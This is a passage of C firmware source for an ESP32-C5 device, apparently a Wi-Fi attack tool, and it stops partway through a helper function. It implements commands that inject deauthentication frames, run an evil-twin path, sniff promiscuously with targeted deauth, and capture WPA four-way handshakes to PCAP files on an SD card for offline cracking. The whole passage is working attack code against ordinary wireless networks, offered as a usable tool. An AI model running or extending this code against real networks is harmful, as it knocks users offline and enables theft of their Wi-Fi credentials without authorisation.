brokali/projectZeroTouch/ESP32C5/main/main.c
    // Cleanup
    handshake_cleanup();
    
    MY_LOG_INFO(TAG, "Handshake attack task finished.");
    vTaskDelete(NULL);
}

static int cmd_start_deauth(int argc, char **argv) {
    {
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        char oled_ch[32];
        oled_build_channel_info(oled_ch, sizeof(oled_ch));
        oled_display_update_full("> Deauth Attack", oled_target, oled_ch, "  Active...");
    }
    onlyDeauth = 1;
    return cmd_start_evil_twin(argc, argv);
}

static int cmd_start_handshake(int argc, char **argv) {
    {
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        char oled_ch[32];
        oled_build_channel_info(oled_ch, sizeof(oled_ch));
        oled_display_update_full("> WPA Capture", oled_target, "  Deauth+Capture", "  Hunting...");
    }
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Enable AP mode for raw frame injection (deauth packets)
    if (!ensure_ap_mode()) {
        MY_LOG_INFO(TAG, "Failed to enable AP mode for deauth injection");
        return 1;
    }
    
    // Check if handshake attack is already running
    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Handshake attack already running. Use 'stop' to stop it first.");
        return 1;
    }

    // Optional: allow passing indexes directly (like "start_handshake 13 14")
    if (argc > 1) {
        // If a scan is still running, wait briefly for completion
        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "Scan in progress - waiting to finish before starting handshake...");
            int wait_loops = 0;
            while (g_scan_in_progress && wait_loops < 100) { // ~10s max
                vTaskDelay(pdMS_TO_TICKS(100));
                wait_loops++;
            }
        }

        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results yet. Run scan_networks first.");
            return 1;
        }

        // Build selection from provided indexes (1-based like UI)
        g_selected_count = 0;
        for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
            int idx = atoi(argv[i]) - 1;
            if (idx < 0 || idx >= (int)g_scan_count) {
                ESP_LOGW(TAG,"Index %d out of bounds (1..%u)", idx + 1, g_scan_count);
                continue;
            }
            g_selected_indices[g_selected_count++] = idx;
        }

        if (g_selected_count == 0) {
            MY_LOG_INFO(TAG, "No valid targets from arguments. Aborting handshake.");
            return 1;
        }
    }
    
    // Reset stop flag
    operation_stop_requested = false;
    
    // Initialize state
    handshake_target_count = 0;
    handshake_current_index = 0;
    memset(handshake_targets, 0, MAX_AP_CNT * sizeof(wifi_ap_record_t));
    memset(handshake_captured, 0, sizeof(handshake_captured));
    
    // Check if networks were selected
    if (g_selected_count > 0) {
        // Selected networks mode
        handshake_selected_mode = true;
        handshake_target_count = g_selected_count;
        
        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Selected Networks Mode");
        MY_LOG_INFO(TAG, "Targets: %d network(s)", g_selected_count);
        
        // Copy selected networks to handshake targets
        for (int i = 0; i < g_selected_count; i++) {
            int idx = g_selected_indices[i];
            memcpy(&handshake_targets[i], &g_scan_results[idx], sizeof(wifi_ap_record_t));
            MY_LOG_INFO(TAG, "  [%d] SSID='%s' Ch=%d", 
                       i + 1, (const char*)handshake_targets[i].ssid, handshake_targets[i].primary);
        }
        
        MY_LOG_INFO(TAG, "Will spend max 40s on each network");
        MY_LOG_INFO(TAG, "Will stop automatically when all networks captured");
    } else {
        // Sniffer + D-UCB mode (replaces old scan-all)
        handshake_selected_mode = false;
        
        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Sniffer + D-UCB Mode");
        MY_LOG_INFO(TAG, "No networks selected - promiscuous sniffer with D-UCB channel selection");
        MY_LOG_INFO(TAG, "Will discover APs/clients from traffic and send targeted deauth");
        MY_LOG_INFO(TAG, "Will run until 'stop' command");
        MY_LOG_INFO(TAG, "Existing handshakes in /sdcard/lab/handshakes/ will be skipped");
    }
    
    MY_LOG_INFO(TAG, "Method: %s", handshake_selected_mode 
                ? "Broadcast deauth + passive capture" 
                : "Sniffer + D-UCB + targeted deauth");
    MY_LOG_INFO(TAG, "Handshakes will be saved automatically to SD card");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack");
    
    // Start handshake attack task
    handshake_attack_active = true;
    BaseType_t result = xTaskCreate(
        handshake_attack_task,
        "handshake_attack",
        12288, // Stack size (larger for sniffer mode PCAP/HCCAPX operations)
        NULL,
        5,     // Priority
        &handshake_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create handshake attack task!");
        handshake_attack_active = false;
        return 1;
    }
    
    return 0;
}

static int cmd_save_handshake(int argc, char **argv) {
    oled_display_update_full("> Save Capture", "  Writing PCAP", "  /lab/handshakes", "  SD Card...");
    // Avoid compiler warnings
    (void)argc; (void)argv;
    
    MY_LOG_INFO(TAG, "Manually saving handshake to SD card...");
    
    if (attack_handshake_save_to_sd()) {
        MY_LOG_INFO(TAG, "✓ Handshake saved successfully!");
        MY_LOG_INFO(TAG, "Files saved to: /sdcard/lab/handshakes/");
        return 0;
    } else {
        MY_LOG_INFO(TAG, "✗ Failed to save - no complete 4-way handshake captured");
        MY_LOG_INFO(TAG, "Make sure you captured all 4 messages of the handshake");
        return 1;
    }
}

// --------------- WPA-SEC commands ---------------

static bool wigle_split_key_pair(const char *input,
                                 char *api_name,
                                 size_t api_name_sz,
                                 char *api_token,
                                 size_t api_token_sz) {
    if (!input || !api_name || !api_token || api_name_sz == 0 || api_token_sz == 0) {
        return false;
    }

    const char *start = input;
    while (*start && isspace((unsigned char)*start)) {
        start++;
    }

    const char *sep = strchr(start, ':');
    if (!sep || sep == start) {
        return false;
    }

